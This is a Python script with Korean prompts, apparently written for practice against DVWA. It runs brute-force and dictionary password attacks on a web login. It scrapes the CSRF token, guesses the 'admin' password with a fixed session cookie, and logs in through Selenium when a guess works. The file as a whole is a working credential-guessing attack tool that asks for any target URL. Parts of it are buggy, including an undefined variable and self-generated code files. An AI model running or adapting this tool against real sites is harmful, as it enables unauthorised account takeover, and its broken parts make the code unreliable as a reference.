from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
import time
import random
import string
from _ast import If
import os
import urllib           
import urllib.parse     
import urllib.request   
import requests 



list1=["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"
      ,"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]

list2=['~','!','@','$','%','^','&','*','(',')','-','_','=','+','|','/',"\'","\\",'<','>','?',',','.',"\""]
#자리잡고
li3=["1","2","3","4","5","6","7","8","9","0"]
li4=[]



        
        
def start():
    A=int(input("무차별 공격을 시작하겠습니다.\n무차별 공격은 1번 \n사전 공격은 2번을 눌러 주세요"))
   
    if (A==1):
        D=input("공격할 사이크의 url을 입력해주세요")
        print("대입할 무작위적 패쓰워드의 최소길이와 최대길이를 적어주세요 ex) 4~12")
        A1=int(input("최소길이는?"))
        A2=int(input("최대길이는?"))
        random2(A1,A2,D)
        
        
    elif (A==2):
        D=input("공격할 사이트의 URL을 입력하여 주세요")
        print("사전 공격을 시작하겠습니다.")
        B=input("사전 공격으로 사용할 txt 파일을 선택하여 주세요\n ex) C:\\Users\\홍길동\\Desktop\\a.txt")
        file=open(B,"rt", encoding="utf-8")
        passwords=file.readlines()
        request(D,passwords)


def all(A,q,D):
    A=A
    q=q
    D=D
    w=True
    while (w==True):
        if (q==1):
            li4=list1
            w=False
        elif (q==2):
            li4=list1+list2
            w=False
        elif (q==3):
            li4=list1+li3
            w=False
        elif (q==4):
            li4=list1+list2+li3
            w=False
        else:
            print("입력 외의 값입니다\n지정된 값 중에서 골라주세요\n")
            w=True

    list3=[]
    for i in range(A):
        list3.append(list1[0])
 
    if (A==1):
        x=-1
        url = D
        for i2 in range(len(li4)):
            list3[x]=li4[i2]
            cookies={"PHPSESSID":"7lk7rdnskge95a6m6o8movv90j"}
            res = requests.get(url, cookies=cookies)      
            search_string = "name='user_token' value= "
            string_position = res.text.find(search_string)
            search_position = string_position+len(search_string)
            if string_position > 0: 
                token = res.text[search_position:res.text.find(" /", search_position)] 
            payload = {'username':'admin',
                 'password':list3[x]
                 ,'Login':'Login'
                 ,'user_token':token}
            r = requests.get(url,payload)
            if(r.text.find("Congratulations") > 0):
                print("사용된 유저토큰: "+token)
                print("공격성공 비밀번호는 "+list3[x])
                driver = webdriver.Chrome(ChromeDriverManager().install())
                driver.get(D)
                id = driver.find_element_by_name('username')
                id.send_keys("admin")
                pw = driver.find_element_by_name('password')
                pw.send_keys(password.replace('\n', ''))
                Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
                Search.click()
                driver.wait()
                driver.quit()
                break
            else : 
                print("사용된 유저토큰: "+token)
                print("암호실패!! 공격하는 문자: "+list3[x])
            
            
            
    elif (A>=2):
        f1=open("test2.py","rt",encoding="utf-8")
        c3=f1.read()

        for i in range(A-1):
            c2="def fir"+str(i+1)+"(x):\n    x=-x\n    for i2 in range(len(li4)):\n        list3[x]=li4[i2]\n        fir"+str(i)+"(-x-1)\n" 
            c3+=c2
            f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
            f2.write(c3)

        c2="fir"+str(i+1)+"("+str(i+2)+")"
        c3+=c2
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
        f2.write(c3)   
    
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","rt",encoding="utf-8")
        c4=f2.read()
        c5="A="+str(A)+"\nq="+str(q)+"\nD=\""+str(D)+"\""
        f2=open("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py","wt",encoding="utf-8")
        c6=c5+c4
        f2.write(c6) 


def random2(A1,A2,D):
    rev=[]
    if (A1==A2):
        q=int(input("어떤단어의 조합으로 할지 선택헤주세요\n1.영어-대소문자\n2.영어-대소문자+특수기호\n3.영어-대소문자+숫자\n4.영어-대소문자+특수기호+숫자"))
        all(A1,q,D)
        os.system("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")
    elif (A1<A2):
        q=int(input("어떤단어의 조합으로 할지 선택헤주세요\n1.영어-대소문자\n2.영어-대소문자+특수기호\n3.영어-대소문자+숫자\n4.영어-대소문자+특수기호+숫자"))        
        for i in range(A2-A1):
            rev.append(A2-i)
        rev.append(A1)
        rev.sort()
        for i in range(len(rev)):
            all(rev[i],q,D)    
            os.system("C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")
    else:
        print("지정된 값이 이상합니다. 다시 실행해주세요")     
        
def request(D,passwords):
    for password in passwords: 
        url = D
        cookies={"PHPSESSID":"7lk7rdnskge95a6m6o8movv90j"}
        res = requests.get(url, cookies=cookies)      
        search_string = "name='user_token' value= "
        string_position = res.text.find(search_string)
        search_position = string_position+len(search_string)
        if string_position > 0:
            token = res.text[search_position:res.text.find(" /", search_position)] 
        payload = {'username':'admin',
                 'password':password.replace('\n', '')
                 ,'Login':'Login'
                 ,'user_token':token}
        r = requests.get(url,payload)
        if(r.text.find("Congratulations") > 0):
            print("사용된 유저토큰: "+token)
            print("공격성공 비밀번호는 "+password+"\n")
            driver = webdriver.Chrome(ChromeDriverManager().install())
            driver.get(D)
            id = driver.find_element_by_name('username')
            id.send_keys("admin")
            pw = driver.find_element_by_name('password')
            pw.send_keys(password.replace('\n', ''))
            Search = driver.find_element_by_xpath('/html/body/div/div/div/div/form/input[4]')  
            Search.click()
            driver.wait()
            driver.quit()
            break
        else : 
            print("사용된 유저토큰: "+token)
            print("암호실패!! 공격하는 문자: "+password+"\n")    
    

    #driver.quit()        
def clean():
    os.system("del C:\\Users\\tjdalsdn00\\Desktop\\aaa.py")  
        

if __name__ == '__main__':
    start()
    clean()
    
    #http://localhost/3.dvwa/1.brutefource/0.get/1-3.bruteforce-GET.php
    #E:\\python_coding\\dvwa\\1.Bruteforce\\dictionary_attack.txt
    
    
#      리눅스 로그 확인
#      sudo cat /var/log/apache2/access.log 에서 볼 수 있다.
#      https://blog.naver.com/kdi0373/220522832069 리눅스 구조 참조
#
#      tail -f cat /var/log/apache2/access.log
#      https://sisiblog.tistory.com/218 리눅스 명령어 참조
    